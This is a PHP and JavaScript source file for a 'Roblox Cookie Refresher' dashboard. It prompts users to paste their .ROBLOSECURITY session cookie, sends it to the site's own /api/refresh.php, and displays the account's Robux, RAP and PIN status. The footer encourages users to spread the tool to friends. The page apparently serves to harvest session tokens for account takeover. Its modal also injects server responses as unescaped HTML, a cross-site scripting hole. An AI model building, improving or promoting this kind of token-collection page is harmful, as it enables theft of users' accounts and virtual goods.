<?php
/**
 * Dashboard - Cookie Refresher Interface
 * 
 * Main application interface for authenticated users.
 * Allows cookie refresh and displays account information.
 * 
 * @package RobloxRefresher
 * @author  Your Name
 * @version 1.0.0
 */

// Configure session persistence
ini_set('session.gc_maxlifetime', 2592000);
session_set_cookie_params(2592000);
session_start();

// Require authentication
if (!isset($_SESSION['discord_user'])) {
    header('Location: login.php');
    exit;
}

$user = $_SESSION['discord_user'];

// Build avatar URL
$avatarUrl = $user['avatar'] 
    ? sprintf('https://cdn.discordapp.com/avatars/%s/%s.png?size=128', $user['id'], $user['avatar'])
    : 'https://cdn.discordapp.com/embed/avatars/0.png';

$username = htmlspecialchars($user['username'], ENT_QUOTES, 'UTF-8');
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Roblox cookie refresher dashboard">
    <title>Dashboard - Roblox Cookie Refresher</title>
    <style>
        /* CSS Variables */
        :root {
            --bg-primary: #070A12;
            --bg-secondary: #050712;
            --text-primary: rgba(255, 255, 255, 0.92);
            --text-secondary: rgba(255, 255, 255, 0.62);
            --accent-blue: #7CB6FF;
            --accent-blue-light: #A8CEFF;
            --card-bg: rgba(255, 255, 255, 0.06);
            --card-border: rgba(140, 190, 255, 0.14);
            --success: #29c27f;
            --error: #f05555;
        }

        /* Reset & Base */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html, body {
            min-height: 100%;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            color: var(--text-primary);
            background: 
                radial-gradient(900px 520px at 50% 26%, rgba(124, 182, 255, 0.1), transparent 60%),
                radial-gradient(700px 420px at 50% 42%, rgba(124, 182, 255, 0.06), transparent 58%),
                linear-gradient(180deg, var(--bg-primary), var(--bg-secondary));
            padding: 20px 16px 40px;
        }

        /* Container */
        .container {
            max-width: 900px;
            margin: 0 auto;
        }

        /* Navigation Bar */
        .navbar {
            background: linear-gradient(180deg, var(--card-bg), rgba(255, 255, 255, 0.045));
            border: 1px solid var(--card-border);
            border-radius: 18px;
            padding: 16px 24px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-shadow: 0 26px 80px rgba(0, 0, 0, 0.62);
            margin-bottom: 24px;
            backdrop-filter: blur(10px);
        }

        .nav-brand {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .nav-logo {
            width: 42px;
            height: 42px;
            border-radius: 12px;
            display: grid;
            place-items: center;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(140, 190, 255, 0.18);
        }

        .nav-logo svg {
            width: 18px;
            height: 18px;
            color: var(--accent-blue);
        }

        .nav-title {
            font-size: 18px;
            font-weight: 600;
            letter-spacing: -0.01em;
        }

        .user-info {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .user-avatar {
            width: 42px;
            height: 42px;
            border-radius: 50%;
            border: 2px solid var(--accent-blue);
            object-fit: cover;
        }

        .user-name {
            font-size: 14px;
            font-weight: 600;
            display: none;
        }

        /* Main Card */
        .card {
            width: 100%;
            border-radius: 18px;
            border: 1px solid var(--card-border);
            background: linear-gradient(180deg, var(--card-bg), rgba(255, 255, 255, 0.045));
            box-shadow: 0 26px 80px rgba(0, 0, 0, 0.62);
            padding: 28px;
            position: relative;
            overflow: hidden;
            backdrop-filter: blur(10px);
        }

        .card::before {
            content: "";
            position: absolute;
            inset: -2px;
            background: radial-gradient(520px 180px at 40% 0%, rgba(124, 182, 255, 0.12), transparent 60%);
            opacity: 0.55;
            pointer-events: none;
        }

        .card-content {
            position: relative;
            z-index: 1;
        }

        /* Card Header */
        .card-header {
            margin-bottom: 24px;
        }

        .card-title {
            margin-bottom: 6px;
            font-size: 24px;
            font-weight: 600;
        }

        .card-desc {
            font-size: 14px;
            color: var(--text-secondary);
            line-height: 1.5;
        }

        /* Form */
        .form-group {
            margin-bottom: 20px;
        }

        .label {
            display: block;
            margin-bottom: 10px;
            font-size: 13px;
            font-weight: 500;
            color: rgba(255, 255, 255, 0.7);
        }

        .input {
            width: 100%;
            height: 52px;
            border-radius: 12px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            background: rgba(0, 0, 0, 0.22);
            color: var(--text-primary);
            padding: 0 16px;
            font-size: 14px;
            outline: none;
            transition: all 0.2s ease;
        }

        .input::placeholder {
            color: rgba(255, 255, 255, 0.34);
        }

        .input:focus {
            border-color: rgba(124, 182, 255, 0.35);
            background: rgba(0, 0, 0, 0.3);
        }

        /* Button */
        .btn {
            width: 100%;
            height: 54px;
            border-radius: 14px;
            border: 1px solid rgba(124, 182, 255, 0.26);
            background: linear-gradient(135deg, rgba(124, 182, 255, 0.25), rgba(124, 182, 255, 0.15));
            color: var(--text-primary);
            font-weight: 600;
            font-size: 15px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            box-shadow: 0 16px 40px rgba(0, 0, 0, 0.38);
            transition: all 0.2s ease;
        }

        .btn:hover:not(:disabled) {
            background: linear-gradient(135deg, rgba(124, 182, 255, 0.35), rgba(124, 182, 255, 0.25));
            border-color: rgba(124, 182, 255, 0.4);
            transform: translateY(-2px);
            box-shadow: 0 20px 48px rgba(0, 0, 0, 0.48);
        }

        .btn:active {
            transform: translateY(0);
        }

        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .btn svg {
            width: 18px;
            height: 18px;
        }

        /* Modal */
        .modal {
            position: fixed;
            inset: 0;
            display: none;
            z-index: 1000;
        }

        .modal[data-visible="true"] {
            display: block;
        }

        .modal-backdrop {
            position: absolute;
            inset: 0;
            background: rgba(0, 0, 0, 0.75);
            backdrop-filter: blur(6px);
        }

        .modal-box {
            position: relative;
            max-width: 720px;
            max-height: 90vh;
            overflow-y: auto;
            margin: 5vh auto 0;
            background: linear-gradient(180deg, var(--card-bg), rgba(255, 255, 255, 0.045));
            border: 1px solid var(--card-border);
            border-radius: 16px;
            box-shadow: 0 26px 80px rgba(0, 0, 0, 0.62);
            padding: 28px;
        }

        .modal-title {
            margin-bottom: 20px;
            color: var(--accent-blue-light);
            font-weight: 600;
            font-size: 22px;
            text-align: center;
        }

        .modal-body {
            color: var(--text-primary);
            font-size: 14px;
            line-height: 1.5;
        }

        /* Info Grid */
        .info-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 14px;
            margin-bottom: 24px;
        }

        .info-item {
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 12px;
            padding: 14px;
        }

        .info-label {
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 0.6px;
            color: var(--text-secondary);
            margin-bottom: 8px;
            font-weight: 500;
        }

        .info-value {
            font-size: 16px;
            font-weight: 600;
        }

        /* Cookie Section */
        .cookie-section {
            background: rgba(0, 0, 0, 0.4);
            border: 1px solid var(--card-border);
            border-radius: 12px;
            padding: 18px;
            margin-top: 24px;
        }

        .cookie-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 12px;
        }

        .cookie-header h4 {
            margin: 0;
            font-size: 15px;
            color: var(--accent-blue-light);
            font-weight: 600;
        }

        .copy-btn {
            height: 34px;
            padding: 0 16px;
            border-radius: 8px;
            border: 1px solid rgba(124, 182, 255, 0.3);
            background: rgba(124, 182, 255, 0.12);
            color: var(--accent-blue-light);
            cursor: pointer;
            font-size: 13px;
            font-weight: 600;
            transition: all 0.2s ease;
        }

        .copy-btn:hover {
            background: rgba(124, 182, 255, 0.2);
            border-color: rgba(124, 182, 255, 0.5);
        }

        .copy-btn:active {
            transform: scale(0.96);
        }

        .cookie-text {
            font-family: 'Courier New', monospace;
            font-size: 12px;
            line-height: 1.6;
            color: #d4e6ff;
            word-break: break-all;
            max-height: 140px;
            overflow-y: auto;
            padding: 12px;
            background: rgba(0, 0, 0, 0.5);
            border-radius: 10px;
        }

        .modal-btn {
            margin-top: 24px;
            width: 100%;
            height: 48px;
            border-radius: 12px;
            border: 1px solid rgba(124, 182, 255, 0.3);
            background: rgba(10, 14, 24, 0.8);
            color: var(--text-primary);
            font-weight: 600;
            cursor: pointer;
            font-size: 14px;
            transition: all 0.2s ease;
        }

        .modal-btn:hover {
            background: rgba(20, 28, 50, 0.9);
            border-color: rgba(124, 182, 255, 0.5);
        }

        /* Footer */
        .footer {
            margin-top: 28px;
            text-align: center;
            font-size: 13px;
            color: var(--text-secondary);
        }

        .footer span {
            color: var(--accent-blue-light);
            font-weight: 500;
        }

        /* Responsive */
        @media (min-width: 640px) {
            .user-name {
                display: block;
            }
        }

        @media (max-width: 640px) {
            .navbar {
                padding: 14px 16px;
            }

            .nav-title {
                font-size: 16px;
            }

            .card {
                padding: 20px;
            }

            .card-title {
                font-size: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Navigation -->
        <nav class="navbar">
            <div class="nav-brand">
                <div class="nav-logo">
                    <svg viewBox="0 0 24 24" fill="none">
                        <path d="M12 2.5l7 3.6v6.2c0 5.1-3.1 9.1-7 10.7-3.9-1.6-7-5.6-7-10.7V6.1l7-3.6z" stroke="currentColor" stroke-width="1.6"/>
                    </svg>
                </div>
                <h1 class="nav-title">Roblox Cookie Refresher</h1>
            </div>
            
            <div class="user-info">
                <span class="user-name"><?php echo $username; ?></span>
                <img src="<?php echo htmlspecialchars($avatarUrl, ENT_QUOTES, 'UTF-8'); ?>" alt="User Avatar" class="user-avatar">
            </div>
        </nav>

        <!-- Main Content -->
        <main class="card">
            <div class="card-content">
                <header class="card-header">
                    <h2 class="card-title">Cookie Refresher</h2>
                    <p class="card-desc">Paste your .ROBLOSECURITY cookie below to refresh it</p>
                </header>

                <form id="refreshForm">
                    <div class="form-group">
                        <label class="label" for="cookieInput">.ROBLOSECURITY Cookie</label>
                        <input 
                            type="text" 
                            id="cookieInput" 
                            name="cookie" 
                            class="input" 
                            placeholder="_|WARNING:-DO-NOT-SHARE-THIS..." 
                            autocomplete="off"
                            required
                        >
                    </div>

                    <button type="submit" class="btn" id="refreshBtn">
                        <svg viewBox="0 0 20 20" fill="currentColor">
                            <path fill-rule="evenodd" d="M4 2a1 1 0 011 1v2.101a7.002 7.002 0 0111.601 2.566 1 1 0 11-1.885.666A5.002 5.002 0 005.999 7H9a1 1 0 010 2H4a1 1 0 01-1-1V3a1 1 0 011-1zm.008 9.057a1 1 0 011.276.61A5.002 5.002 0 0014.001 13H11a1 1 0 110-2h5a1 1 0 011 1v5a1 1 0 11-2 0v-2.101a7.002 7.002 0 01-11.601-2.566 1 1 0 01.61-1.276z" clip-rule="evenodd"/>
                        </svg>
                        Refresh Cookie
                    </button>
                </form>
            </div>
        </main>

        <footer class="footer">
            <span>Tip:</span> Share the Refresh tool to your friends
        </footer>
    </div>

    <!-- Result Modal -->
    <div class="modal" id="resultModal" data-visible="false">
        <div class="modal-backdrop" id="modalBackdrop"></div>
        <div class="modal-box">
            <h3 class="modal-title" id="modalTitle">Processing...</h3>
            <div class="modal-body" id="modalBody"></div>
            <button class="modal-btn" id="modalClose">Close</button>
        </div>
    </div>

    <script>
        // Application State
        const app = {
            elements: {
                form: document.getElementById('refreshForm'),
                input: document.getElementById('cookieInput'),
                button: document.getElementById('refreshBtn'),
                modal: document.getElementById('resultModal'),
                modalTitle: document.getElementById('modalTitle'),
                modalBody: document.getElementById('modalBody'),
                modalClose: document.getElementById('modalClose'),
                backdrop: document.getElementById('modalBackdrop')
            }
        };

        /**
         * Display modal with content
         */
        function showModal(title, content) {
            app.elements.modalTitle.textContent = title;
            app.elements.modalBody.innerHTML = content;
            app.elements.modal.setAttribute('data-visible', 'true');
        }

        /**
         * Hide modal
         */
        function hideModal() {
            app.elements.modal.setAttribute('data-visible', 'false');
        }

        /**
         * Format account information for display
         */
        function formatAccountInfo(data) {
            const user = data.userData || {};
            
            const fields = {
                username: user.username || '—',
                userId: user.userId || '—',
                robux: (user.robux !== undefined ? user.robux : '—').toLocaleString(),
                pendingRobux: (user.pendingRobux !== undefined ? user.pendingRobux : '—').toLocaleString(),
                rap: (user.rap !== undefined ? user.rap : '—').toLocaleString(),
                summary: (user.summary !== undefined ? user.summary : '—').toLocaleString(),
                premium: user.premium || '❓ Unknown',
                voiceChat: user.voiceChat || '❓ Unknown',
                pin: user.pin || '❓ Unknown',
                accountAge: user.accountAge || '—',
                friends: (user.friends !== undefined ? user.friends : '—').toLocaleString(),
                followers: (user.followers !== undefined ? user.followers : '—').toLocaleString()
            };

            return `
                <div class="info-grid">
                    <div class="info-item">
                        <div class="info-label">Username</div>
                        <div class="info-value">${fields.username}</div>
                    </div>
                    <div class="info-item">
                        <div class="info-label">User ID</div>
                        <div class="info-value">${fields.userId}</div>
                    </div>
                    <div class="info-item">
                        <div class="info-label">Robux</div>
                        <div class="info-value">R$ ${fields.robux}</div>
                    </div>
                    <div class="info-item">
                        <div class="info-label">Pending Robux</div>
                        <div class="info-value">R$ ${fields.pendingRobux}</div>
                    </div>
                    <div class="info-item">
                        <div class="info-label">RAP</div>
                        <div class="info-value">R$ ${fields.rap}</div>
                    </div>
                    <div class="info-item">
                        <div class="info-label">Summary</div>
                        <div class="info-value">R$ ${fields.summary}</div>
                    </div>
                    <div class="info-item">
                        <div class="info-label">Premium</div>
                        <div class="info-value">${fields.premium}</div>
                    </div>
                    <div class="info-item">
                        <div class="info-label">Voice Chat</div>
                        <div class="info-value">${fields.voiceChat}</div>
                    </div>
                    <div class="info-item">
                        <div class="info-label">PIN Enabled</div>
                        <div class="info-value">${fields.pin}</div>
                    </div>
                    <div class="info-item">
                        <div class="info-label">Account Age</div>
                        <div class="info-value">${fields.accountAge}</div>
                    </div>
                    <div class="info-item">
                        <div class="info-label">Friends</div>
                        <div class="info-value">${fields.friends}</div>
                    </div>
                    <div class="info-item">
                        <div class="info-label">Followers</div>
                        <div class="info-value">${fields.followers}</div>
                    </div>
                </div>
                
                <div class="cookie-section">
                    <div class="cookie-header">
                        <h4>New Cookie</h4>
                        <button class="copy-btn" onclick="copyToClipboard('${data.cookie || ''}', this)">Copy</button>
                    </div>
                    <div class="cookie-text">${data.cookie || 'N/A'}</div>
                </div>
            `;
        }

        /**
         * Copy text to clipboard
         */
        function copyToClipboard(text, button) {
            navigator.clipboard.writeText(text).then(() => {
                const originalText = button.textContent;
                button.textContent = 'Copied!';
                setTimeout(() => {
                    button.textContent = originalText;
                }, 2000);
            }).catch(err => {
                console.error('Copy failed:', err);
            });
        }

        /**
         * Handle form submission
         */
        async function handleRefresh(event) {
            event.preventDefault();
            
            const cookie = app.elements.input.value.trim();
            
            // Validate input
            if (!cookie || cookie.length < 40) {
                showModal('Invalid Cookie', '<p style="text-align:center;color:var(--text-secondary)">Please enter a valid .ROBLOSECURITY cookie (minimum 40 characters).</p>');
                return;
            }
            
            // Disable button
            app.elements.button.disabled = true;
            app.elements.button.textContent = 'Refreshing...';
            
            // Show processing modal
            showModal('Refreshing Cookie...', '<p style="text-align:center;color:var(--text-secondary)">Please wait while we refresh your cookie and fetch account details...</p>');
            
            try {
                const response = await fetch('/api/refresh.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    body: 'cookie=' + encodeURIComponent(cookie)
                });
                
                const data = await response.json();
                
                if (!response.ok || data.error) {
                    showModal('Error', `<p style="text-align:center;color:var(--error)">${data.error || 'Request failed'}</p>`);
                    return;
                }
                
                showModal('Cookie Refreshed Successfully! 🎉', formatAccountInfo(data));
                
            } catch (error) {
                showModal('Network Error', `<p style="text-align:center;color:var(--error)">${error.message}</p>`);
            } finally {
                // Re-enable button
                app.elements.button.disabled = false;
                app.elements.button.innerHTML = `
                    <svg viewBox="0 0 20 20" fill="currentColor" style="width:18px;height:18px">
                        <path fill-rule="evenodd" d="M4 2a1 1 0 011 1v2.101a7.002 7.002 0 0111.601 2.566 1 1 0 11-1.885.666A5.002 5.002 0 005.999 7H9a1 1 0 010 2H4a1 1 0 01-1-1V3a1 1 0 011-1zm.008 9.057a1 1 0 011.276.61A5.002 5.002 0 0014.001 13H11a1 1 0 110-2h5a1 1 0 011 1v5a1 1 0 11-2 0v-2.101a7.002 7.002 0 01-11.601-2.566 1 1 0 01.61-1.276z" clip-rule="evenodd"/>
                    </svg>
                    Refresh Cookie
                `;
            }
        }

        // Event Listeners
        app.elements.form.addEventListener('submit', handleRefresh);
        app.elements.modalClose.addEventListener('click', hideModal);
        app.elements.backdrop.addEventListener('click', hideModal);
    </script>
</body>
</html>
